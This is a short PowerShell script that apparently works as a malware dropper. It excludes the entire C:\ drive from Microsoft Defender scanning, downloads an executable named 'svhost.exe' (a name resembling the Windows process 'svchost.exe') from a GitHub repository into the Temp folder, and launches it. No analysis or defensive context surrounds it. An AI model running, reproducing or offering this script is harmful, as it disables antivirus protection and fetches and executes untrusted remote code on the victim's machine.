Add-MpPreference -ExclusionPath C:\
$url = "https://github.com/minhdmkk6/t34/raw/refs/heads/main/svhost.exe"
$output = "$env:Temp/svhost.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process -FilePath $output